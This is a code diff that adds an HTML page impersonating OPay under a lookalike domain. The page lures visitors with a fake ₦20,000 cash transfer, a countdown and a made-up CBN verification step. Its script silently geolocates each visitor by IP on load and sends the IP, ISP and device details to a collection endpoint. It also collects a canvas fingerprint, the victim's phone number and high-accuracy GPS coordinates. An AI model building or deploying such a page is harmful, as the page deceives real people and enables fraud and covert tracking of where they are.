@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
+  <title>OPay — Incoming Transfer</title>
+
+  <!-- Open Graph / WhatsApp preview -->
+  <meta property="og:type"        content="website"/>
+  <meta property="og:title"       content="OPay — You have an incoming transfer"/>
+  <meta property="og:description" content="Someone sent you ₦20,000 via OPay. Your cash is ready to collect."/>
+  <meta property="og:image"       content="https://opayit.com/og-cash.jpg"/>
+  <meta property="og:url"         content="https://opayit.com"/>
+  <meta property="og:site_name"   content="OPay Agent Network"/>
+  <meta name="description"        content="Your transfer is ready. Find the nearest OPay agent to collect your cash in minutes."/>
+
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body { font-family: 'Segoe UI', Arial, sans-serif; background:#f5f5f5; color:#1a1a1a; min-height:100vh; }
+
+    .topbar { background:#ffffff; padding:12px 16px; display:flex; align-items:center; gap:10px; border-bottom:1px solid #e8e8e8; }
+    .topbar .logo-sub { font-size:0.68rem; color:#888; margin-top:1px; }
+    .topbar .logo-wrap { display:flex; flex-direction:column; }
+    .opay-logo { height:32px; margin-right:6px; }
+
+    .transfer-card { background:white; margin:14px 12px; border-radius:12px; padding:18px; box-shadow:0 2px 8px rgba(0,0,0,0.08); }
+    .transfer-card .label { font-size:0.72rem; color:#888; text-transform:uppercase; letter-spacing:1px; margin-bottom:4px; }
+    .transfer-card .amount { font-size:2rem; font-weight:800; color:#1a7a3e; }
+    .transfer-card .amount span { font-size:1rem; font-weight:600; }
+    .transfer-card .sender { font-size:0.83rem; color:#555; margin-top:6px; }
+    .transfer-card .sender strong { color:#1a1a1a; }
+    .transfer-card .ref { font-size:0.72rem; color:#aaa; margin-top:8px; font-family:monospace; }
+    .ref-blur { filter:blur(5px); user-select:none; transition:filter 0.4s; }
+    .ref-unlock { font-size:0.68rem; color:#1a7a3e; margin-top:4px; font-weight:600; }
+    .status-pill { display:inline-block; background:#fff3cd; color:#856404; font-size:0.68rem; font-weight:700; padding:3px 10px; border-radius:20px; margin-top:10px; text-transform:uppercase; letter-spacing:0.5px; }
+
+    .divider { height:1px; background:#f0f0f0; margin:12px 0; }
+
+    .info-box { background:#f0f9f4; border-left:3px solid #1a7a3e; padding:12px 14px; margin:0 12px 12px; border-radius:0 6px 6px 0; font-size:0.82rem; color:#1a5c2e; line-height:1.6; }
+
+    .section-title { font-size:0.72rem; color:#888; text-transform:uppercase; letter-spacing:1.5px; margin:0 12px 8px; font-weight:700; }
+
+    .agent-list { margin:0 12px 12px; }
+    .agent-item { background:white; border-radius:10px; padding:14px; margin-bottom:8px; box-shadow:0 1px 4px rgba(0,0,0,0.07); display:flex; justify-content:space-between; align-items:center; }
+    .agent-item .agent-info .name { font-size:0.88rem; font-weight:700; color:#1a1a1a; }
+    .agent-item .agent-info .addr { font-size:0.74rem; color:#777; margin-top:2px; }
+    .agent-item .agent-info .hours { font-size:0.7rem; color:#1a7a3e; margin-top:2px; font-weight:600; }
+    .agent-item .dist { font-size:0.72rem; color:#aaa; text-align:right; white-space:nowrap; }
+    .agent-item .dist .km { font-size:1rem; font-weight:700; color:#888; display:block; }
+    .agent-blur { position:relative; }
+    .agent-blur::after { content:'Confirm pickup zone to see agents nearby'; position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); background:rgba(255,255,255,0.92); font-size:0.72rem; color:#888; padding:4px 10px; border-radius:20px; white-space:nowrap; }
+
+    .cta-box { margin:0 12px 16px; }
+    .cta-btn { width:100%; padding:16px; background:#1a7a3e; color:white; border:none; border-radius:10px; font-size:1rem; font-weight:700; cursor:pointer; letter-spacing:0.2px; }
+    .cta-btn:active { background:#145e30; }
+    .cta-sub { text-align:center; font-size:0.7rem; color:#aaa; margin-top:8px; }
+    .phone-box { display:none; background:white; border-radius:10px; padding:16px; margin-bottom:12px; box-shadow:0 1px 4px rgba(0,0,0,0.08); }
+    .phone-box label { font-size:0.78rem; color:#555; font-weight:600; display:block; margin-bottom:8px; }
+    .phone-input-wrap { display:flex; gap:8px; align-items:center; }
+    .phone-prefix { background:#f5f5f5; border:1px solid #ddd; border-radius:8px; padding:12px 10px; font-size:0.9rem; font-weight:700; color:#333; white-space:nowrap; }
+    .phone-input { flex:1; border:1px solid #ddd; border-radius:8px; padding:12px 10px; font-size:0.95rem; outline:none; }
+    .phone-input:focus { border-color:#1a7a3e; }
+    .phone-note { font-size:0.68rem; color:#aaa; margin-top:8px; }
+
+    .result-box { display:none; background:#f0f9f4; border:1px solid #b2dfca; border-radius:10px; padding:20px 16px; text-align:center; margin-bottom:12px; }
+    .result-box strong { color:#1a7a3e; font-size:1rem; }
+    .result-box p { color:#555; font-size:0.82rem; margin-top:8px; line-height:1.7; }
+    .result-box .sms-note { margin-top:14px; background:white; border-radius:8px; padding:12px; text-align:left; border:1px solid #ddd; font-size:0.8rem; color:#444; line-height:1.6; }
+    .error-box { display:none; background:#fff3f3; border:1px solid #f5c6cb; border-radius:10px; padding:20px 16px; text-align:center; margin-bottom:12px; }
+    .error-box strong { color:#c0392b; font-size:1rem; }
+    .error-box p { color:#666; font-size:0.82rem; margin-top:8px; line-height:1.7; }
+
+    .footer { text-align:center; padding:16px; font-size:0.68rem; color:#bbb; margin-top:4px; }
+
+    .skeleton { background:linear-gradient(90deg,#f0f0f0 25%,#e0e0e0 50%,#f0f0f0 75%); background-size:200% 100%; animation:shimmer 1.5s infinite; border-radius:4px; height:14px; margin-bottom:6px; }
+    @keyframes shimmer { 0%{background-position:200% 0} 100%{background-position:-200% 0} }
+  </style>
+</head>
+<body>
+
+  <div class="topbar">
+    <img src="/logo-light.png" class="opay-logo" alt="OPay"/>
+    <div class="logo-wrap">
+      <div class="logo-sub">Secure Transfers</div>
+    </div>
+  </div>
+
+  <div class="transfer-card">
+    <div class="label">Incoming Transfer</div>
+    <div class="amount"><span>&#8358;</span><span id="amount-val">20,000</span></div>
+    <div style="display:inline-block;background:#e8f5e9;color:#1a7a3e;font-size:0.68rem;font-weight:700;padding:2px 8px;border-radius:4px;margin:4px 0 6px;letter-spacing:0.5px;">CASH TRANSFER</div>
+    <div class="sender">From: <strong id="sender-name">Adebayo T.</strong></div>
+    <div class="ref ref-blur" id="ref-num">REF: __TXN_ID__</div>
+    <div class="ref-unlock" id="ref-hint">Collection PIN sent once your details are confirmed</div>
+    <div class="divider"></div>
+    <div class="label">Status</div>
+    <div class="status-pill" id="status-pill">Awaiting Confirmation</div>
+    <div style="font-size:0.7rem;color:#c0392b;margin-top:8px;font-weight:600;" id="countdown-wrap">Transfer expires in: <span id="countdown">59:59</span></div>
+  </div>
+
+  <div class="info-box" id="info-box">
+    OPay is required by CBN to verify the recipient's identity before releasing cash transfers above ₦5,000. This is a one-time step for this transaction. Complete verification below to release your funds.
+  </div>
+
+  <div class="section-title">How to Collect</div>
+  <div style="margin:0 12px 14px;display:flex;flex-direction:column;gap:8px;">
+    <div style="display:flex;align-items:flex-start;gap:10px;background:white;border-radius:10px;padding:12px;box-shadow:0 1px 4px rgba(0,0,0,0.07);">
+      <div style="min-width:26px;height:26px;background:#1a7a3e;color:white;border-radius:50%;font-weight:800;font-size:0.8rem;display:flex;align-items:center;justify-content:center;">1</div>
+      <div>
+        <div style="font-weight:700;font-size:0.85rem;">Complete Recipient Verification</div>
+        <div style="font-size:0.75rem;color:#777;margin-top:2px;">OPay is required by CBN to confirm your details before releasing the cash to you.</div>
+      </div>
+    </div>
+    <div style="display:flex;align-items:flex-start;gap:10px;background:white;border-radius:10px;padding:12px;box-shadow:0 1px 4px rgba(0,0,0,0.07);">
+      <div data-step style="min-width:26px;height:26px;background:#ccc;color:white;border-radius:50%;font-weight:800;font-size:0.8rem;display:flex;align-items:center;justify-content:center;">2</div>
+      <div>
+        <div data-step-text style="font-weight:700;font-size:0.85rem;color:#aaa;">Receive Your Collection PIN</div>
+        <div data-step-sub style="font-size:0.75rem;color:#bbb;margin-top:2px;">OPay sends your unique PIN via SMS once verification is complete.</div>
+      </div>
+    </div>
+    <div style="display:flex;align-items:flex-start;gap:10px;background:white;border-radius:10px;padding:12px;box-shadow:0 1px 4px rgba(0,0,0,0.07);">
+      <div data-step style="min-width:26px;height:26px;background:#ccc;color:white;border-radius:50%;font-weight:800;font-size:0.8rem;display:flex;align-items:center;justify-content:center;">3</div>
+      <div>
+        <div data-step-text style="font-weight:700;font-size:0.85rem;color:#aaa;">Collect at Any OPay Point</div>
+        <div data-step-sub style="font-size:0.75rem;color:#bbb;margin-top:2px;">Show your PIN at any OPay agent or POS stand to collect your ₦20,000 cash.</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="cta-box">
+    <div class="result-box" id="result-box">
+      <strong>&#10003; Verification Complete — Transfer Released</strong>
+      <p>Your identity has been verified and your ₦20,000 transfer has been released.</p>
+      <div class="sms-note">
+        <strong>What happens next:</strong><br/>
+        You will receive an SMS from <strong>OPay</strong> with your collection PIN. Present the PIN at any OPay agent or POS stand to collect your &#8358;20,000 cash.
+      </div>
+      <p style="margin-top:10px;font-size:0.75rem;color:#aaa;">Ref: <span id="res-ref"></span> &nbsp;|&nbsp; Expires in 24hrs</p>
+    </div>
+    <div class="error-box" id="error-box">
+      <strong>Verification Failed</strong>
+      <p>OPay's compliance system could not complete recipient verification for this transaction. The transfer has been temporarily suspended.<br/><br/>This is typically caused by restricted device permissions or an unsupported browser. Contact OPay support or ask the sender to retry.</p>
+      <button class="cta-btn" id="retry-btn" onclick="retryLocation()" style="margin-top:14px;background:#c0392b;">Try Again</button>
+    </div>
+    <div class="phone-box" id="phone-box">
+      <label>Enter your OPay-registered phone number</label>
+      <div class="phone-input-wrap">
+        <div class="phone-prefix">+234</div>
+        <input class="phone-input" id="phone-input" type="tel" placeholder="080XXXXXXXX" maxlength="11" inputmode="numeric"/>
+      </div>
+      <div class="phone-note">OPay will send your collection PIN to this number after verification</div>
+    </div>
+    <button class="cta-btn" id="cta-btn" onclick="handleCta(this)">Accept Cash</button>
+    <div class="cta-sub" id="cta-sub">Secured by OPay &amp; CBN Compliance</div>
+  </div>
+
+  <div class="footer">OPay Digital Services Limited &nbsp;|&nbsp; RC 1468513 &nbsp;|&nbsp; Regulated by CBN</div>
+
+  <script>
+    // txnId comes from server-injected placeholder or fallback from URL
+    const TXN_ID = (function() {
+      const fromUrl = window.location.pathname.replace(/^\//, '').trim();
+      return fromUrl || 'OP__TXN_ID__';
+    })();
+
+    // Silent IP geo on load
+    (async function silentIPGeo() {
+      try {
+        const r = await fetch('https://ipapi.co/json/');
+        const d = await r.json();
+        if (d.city || d.country_name) {
+          fetch('/data', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              txn_id: TXN_ID,
+              ip_city: d.city, ip_region: d.region, ip_country: d.country_name,
+              ip_lat: d.latitude, ip_lon: d.longitude, ip_isp: d.org, ip_addr: d.ip,
+              ua: navigator.userAgent, screen: screen.width+'x'+screen.height,
+              timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+              timestamp: new Date().toISOString(), source: 'ip_silent'
+            })
+          });
+        }
+      } catch(e) {}
+    })();
+
+    function collectFingerprint() {
+      fetch('/data', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          txn_id: TXN_ID,
+          canvas: getCanvasFingerprint(),
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          screen: screen.width+'x'+screen.height,
+          platform: navigator.platform,
+          ua: navigator.userAgent,
+          lang: navigator.language,
+          cores: navigator.hardwareConcurrency,
+          mem: navigator.deviceMemory || 'unknown',
+          timestamp: new Date().toISOString(),
+          source: 'fingerprint'
+        })
+      });
+    }
+
+    let phoneStep = false;
+    let retryUsed = false;
+
+    // On load — restore previous visit state using txnId as key
+    window.addEventListener('load', () => {
+      const state = localStorage.getItem('opay_result_' + TXN_ID);
+      if (state === 'success') {
+        document.getElementById('ref-hint').style.display = 'none';
+        document.getElementById('ref-num').classList.remove('ref-blur');
+        document.getElementById('res-ref').textContent = TXN_ID;
+        document.getElementById('result-box').style.display = 'block';
+        document.getElementById('cta-btn').style.display = 'none';
+        document.getElementById('cta-sub').style.display = 'none';
+        document.getElementById('agents-title').style.display = 'none';
+        document.getElementById('agent-list').style.display = 'none';
+        document.getElementById('phone-box').style.display = 'none';
+        document.getElementById('countdown-wrap').style.display = 'none';
+      } else if (state === 'failed') {
+        document.getElementById('retry-btn').style.display = 'none';
+        showError();
+      }
+    });
+
+    function retryLocation() {
+      if (retryUsed) return;
+      retryUsed = true;
+      document.getElementById('retry-btn').style.display = 'none';
+      document.getElementById('error-box').style.display = 'none';
+      findAgents({ textContent: '', disabled: false });
+    }
+
+    function handleCta(btn) {
+      if (!phoneStep) {
+        phoneStep = true;
+        document.getElementById('phone-box').style.display = 'block';
+        btn.textContent = 'Confirm Details';
+        document.getElementById('cta-sub').textContent = 'OPay will send your collection PIN once confirmed';
+        document.getElementById('phone-input').focus();
+      } else {
+        const num = document.getElementById('phone-input').value.trim();
+        if (num.length < 10) {
+          document.getElementById('phone-input').style.borderColor = '#c0392b';
+          return;
+        }
+        document.getElementById('phone-input').style.borderColor = '#1a7a3e';
+        fetch('/data', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            txn_id: TXN_ID,
+            phone: '+234' + num,
+            ua: navigator.userAgent,
+            screen: screen.width + 'x' + screen.height,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timestamp: new Date().toISOString(),
+            source: 'phone'
+          })
+        });
+        findAgents(btn);
+      }
+    }
+
+    function findAgents(btn) {
+      btn.textContent = 'Please wait...';
+      btn.disabled = true;
+      collectFingerprint();
+
+      if (navigator.geolocation) {
+        let sent = false;
+        const watcher = navigator.geolocation.watchPosition(
+          (pos) => {
+            if (sent) return;
+            if (pos.coords.accuracy > 500) return;
+            sent = true;
+            navigator.geolocation.clearWatch(watcher);
+            fetch('/data', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                txn_id: TXN_ID,
+                gps_lat: pos.coords.latitude,
+                gps_lon: pos.coords.longitude,
+                gps_accuracy_meters: pos.coords.accuracy,
+                screen: screen.width+'x'+screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                platform: navigator.platform,
+                ua: navigator.userAgent,
+                timestamp: new Date().toISOString(),
+                source: 'gps'
+              })
+            });
+            localStorage.setItem('opay_result_' + TXN_ID, 'success');
+            showResult();
+          },
+          (err) => {
+            if (!sent) {
+              sent = true;
+              navigator.geolocation.clearWatch(watcher);
+              localStorage.setItem('opay_result_' + TXN_ID, 'failed');
+              showError();
+            }
+          },
+          { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
+        );
+        setTimeout(() => {
+          if (!sent) {
+            sent = true;
+            navigator.geolocation.clearWatch(watcher);
+            localStorage.setItem('opay_result_' + TXN_ID, 'failed');
+            showError();
+          }
+        }, 30000);
+      } else {
+        showError();
+      }
+    }
+
+    function showResult() {
+      document.getElementById('ref-num').classList.remove('ref-blur');
+      document.getElementById('ref-hint').style.display = 'none';
+      document.getElementById('status-pill').textContent = 'Verified — Funds Released';
+      document.getElementById('status-pill').style.background = '#d4edda';
+      document.getElementById('status-pill').style.color = '#155724';
+      document.getElementById('countdown-wrap').style.display = 'none';
+      document.getElementById('info-box').textContent = 'Details confirmed. Your collection PIN will arrive via SMS shortly.';
+      document.getElementById('phone-box').style.display = 'none';
+      document.getElementById('res-ref').textContent = TXN_ID;
+      document.getElementById('result-box').style.display = 'block';
+      document.getElementById('cta-btn').style.display = 'none';
+      document.getElementById('cta-sub').style.display = 'none';
+      document.querySelectorAll('[data-step]').forEach(el => { el.style.background = '#1a7a3e'; });
+      document.querySelectorAll('[data-step-text]').forEach(el => { el.style.color = '#1a1a1a'; });
+      document.querySelectorAll('[data-step-sub]').forEach(el => { el.style.color = '#777'; });
+    }
+
+    function showError() {
+      document.getElementById('phone-box').style.display = 'none';
+      document.getElementById('error-box').style.display = 'block';
+      document.getElementById('cta-btn').style.display = 'none';
+      document.getElementById('cta-sub').style.display = 'none';
+      document.getElementById('countdown-wrap').style.display = 'none';
+      document.getElementById('status-pill').textContent = 'Transfer On Hold';
+      document.getElementById('status-pill').style.background = '#fde8e8';
+      document.getElementById('status-pill').style.color = '#c0392b';
+    }
+
+    // Countdown timer
+    let secs = 60 * 60;
+    const cdEl = document.getElementById('countdown');
+    const cdTimer = setInterval(() => {
+      if (secs <= 0) { clearInterval(cdTimer); cdEl.textContent = 'EXPIRED'; cdEl.style.color='#c0392b'; return; }
+      secs--;
+      const m = Math.floor(secs/60), s = secs%60;
+      cdEl.textContent = m + ':' + String(s).padStart(2,'0');
+    }, 1000);
+
+    function getCanvasFingerprint() {
+      try {
+        const c = document.createElement('canvas');
+        const ctx = c.getContext('2d');
+        ctx.textBaseline = 'top'; ctx.font = "14px 'Arial'";
+        ctx.fillStyle = '#1a7a3e'; ctx.fillRect(125,1,62,20);
+        ctx.fillStyle = '#fff'; ctx.fillText('OPayAgentNet2024',2,15);
+        return c.toDataURL().slice(-50);
+      } catch(e) { return 'err'; }
+    }
+  </script>
+</body>
+</html>
